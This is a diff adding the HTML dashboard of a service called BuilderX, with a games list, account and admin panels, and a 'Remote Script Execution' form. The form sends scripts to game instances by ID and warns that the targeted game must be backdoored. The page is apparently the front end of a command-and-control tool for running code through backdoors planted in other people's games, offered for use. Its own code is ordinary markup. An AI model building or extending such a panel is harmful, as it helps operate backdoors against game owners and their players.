@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script type="text/javascript">window.$crisp=[];window.CRISP_WEBSITE_ID="4d754260-90d5-4b54-bac9-9b41705f092a";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
+    <title> CAD | Dashboard</title>
+    <meta name="description" content="BuilderX Web Portal"/>
+
+    <meta property="og:title" content="CAD DASHBOARD"/>
+    <meta property="og:description" content="Dashboard. Login required."/>
+    <meta property="og:image" content="icons/android-chrome-384x384.png"/>
+
+    <link rel="stylesheet" href="highlight/styles/agate.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous"/>
+    <link rel="stylesheet" href="dashboard.css"/>
+
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.14/es5-shim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.14/es5-sham.min.js"></script>
+    <![endif]-->
+
+    <!--[if lt IE 7]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/json3/3.3.2/json3.min.js"></script>
+    <![endif]-->
+
+    <!--[if IE]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.5/es6-shim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.5/es6-sham.min.js"></script>
+    <![endif]-->
+
+    <link rel="apple-touch-icon" sizes="180x180" href="icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="icons/favicon-16x16.png">
+    <link rel="manifest" href="icons/site.webmanifest">
+    <link rel="mask-icon" href="icons/safari-pinned-tab.svg" color="#000000">
+    <link rel="shortcut icon" href="icons/favicon.ico">
+    <meta name="apple-mobile-web-app-title" content="BuilderX">
+    <meta name="application-name" content="BuilderX">
+    <meta name="msapplication-TileColor" content="#000000">
+    <meta name="msapplication-config" content="icons/browserconfig.xml">
+    <meta name="theme-color" content="#000000">
+
+    <script src="https://www.google.com/recaptcha/api.js?onload=loadCaptchas&render=explicit" async defer></script>
+
+    <script src="luaparse.js" ></script>
+    <script src="luamin.js" ></script>
+
+    <script defer src="dashboard.js"></script>
+</head>
+<body>
+    <nav class="navbar nav-pills navbar-expand-sm bg-dark navbar-dark">
+        <a class="navbar-brand" href="#">BuilderX</a>
+        <a id="nav-games" class="nav-item nav-link active" href="#">Games</a>
+        <a id="nav-account" class="nav-item nav-link" href="#">Account</a>
+        <a id="nav-admin" class="nav-item nav-link d-none" href="#">Admin</a>
+        <a id="nav-logout" class="nav-item nav-link ml-auto" href="#">Logout</a>
+      </nav>
+    <div id="main-section">
+        <div id="games" class="ipanel">
+            <h1>Games</h1>
+            <br/>
+            <h4>Player count: <b><span class="odometer" id="playercount">0</span></b></h4>
+            <table class="table table-dark">
+                <thead>
+                  <tr>
+                    <th scope="col">Game Name</th>
+                    <th scope="col">Player #</th>
+                    <th scope="col">Last Updated</th>
+                    <th scope="col">Link</th>
+                  </tr>
+                </thead>
+                <tbody id="gamelist">
+                </tbody>
+              </table>
+        </div>
+
+        <div id="account" class="ipanel d-none">
+            <h1>Account</h1>
+
+            <br/>
+
+            <h3>Change Password</h3>
+
+            <div class="alert alert-success w-100 d-none" id="changepass-s">
+                <strong>Success!</strong> Password changed.
+            </div>
+            <div class="alert alert-danger d-none" id="changepass-e" style="width: 100%;">
+                <strong>Error!</strong> <span id="changepass-e-i">[..]</span>
+            </div>
+            <form>
+                <input id="changepass-1" class="form-control w-25" type="password" alt="Old Password" autocomplete="current-password"  name="p" placeholder="Current Password" required="required" />
+                <input id="changepass-2" class="form-control w-25" type="password" alt="New Password" autocomplete="new-password" name="p" placeholder="New Password" required="required" /><br/>
+                <div class="g-recaptcha" id="changepass-re" data-sitekey="6Ld-8dQUAAAAAGAjS3I5Y2qQ2UJEnfd7mP3zF2Q3"></div>
+            </form>
+            <button id="changepass-b" class="btn btn-primary" type="submit">Change Password</button>
+        </div>
+        <div id="admin" class="ipanel d-none">
+            <h1>Admin</h1><br/>
+
+            <div id="newuser" class="d-none">
+
+                <h3>New User Creation</h3>
+
+                <div class="alert alert-success w-100 d-none" id="newuser-s">
+                    <strong>Success!</strong> User created. Password: <pre id="newuser-s-i">[..]</pre>
+                </div>
+                <div class="alert alert-danger d-none" id="newuser-e" style="width: 100%;">
+                    <strong>Error!</strong> <span id="newuser-e-i">[..]</span>
+                </div>
+
+                <form>
+                    <input id="newuser-1" class="form-control w-25" alt="New Username" autocomplete="new-username"  name="p" placeholder="New Username" required="required" />
+                </form>
+                <select name="Permissions" class="form-control w-25", id="newuser-2"></select><br/>
+                
+                <div class="g-recaptcha" id="newuser-re" data-sitekey="6Ld-8dQUAAAAAGAjS3I5Y2qQ2UJEnfd7mP3zF2Q3"></div>
+                <button id="newuser-b" class="btn btn-primary" type="submit">Create User</button>
+
+            </div>
+
+            <div id="rexec" class="d-none">
+                <br/>
+                <h3>Remote Script Lookup</h3>
+                <p>Insert your script ID below. If the output is more than 2000 characters, you will be directed to a file download.</p>
+                <form>
+                    <input id="rexec-lookup-input" class="form-control" type="text" alt="Script ID" placeholder="Script ID" required="required"/>
+                    <br/>
+                </form>
+                <button type="submit" id="rexec-lookup-button" class="btn btn-primary">Lookup script</button>
+                <br/><br/>
+
+                <div class="alert alert-success w-100 d-none" id="rexec-s">
+                    <strong>Success!</strong> Script added successfully.
+                </div>
+
+                <div class="alert alert-danger d-none" id="rexec-e" style="width: 100%; white-space: pre-line;"><strong>Error!</strong> <span id="rexec-e-i">[..]</span>
+                </div>
+
+                <h3>Remote Script Execution</h3>
+                <input id="rexec-id" class="form-control" type="text" alt="Job/Place ID" placeholder="Job/PlaceID" required="required"/>
+                <br/>
+                <label for="comment">Script:</label>
+                <textarea class="form-control border border-secondary" rows="3" id="rexec-script"></textarea>
+                <br/>
+                <p>The targeted game <b>must</b> be backdoored and have HTTP enabled!</p>
+                <button type="submit" id="rexec-run-button" class="btn btn-primary">Run script</button><br/>
+                <br/>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+    <script src="odometer.js"></script>
+    <script src="highlight/highlight.pack.js"></script>
+</body>
+</html>
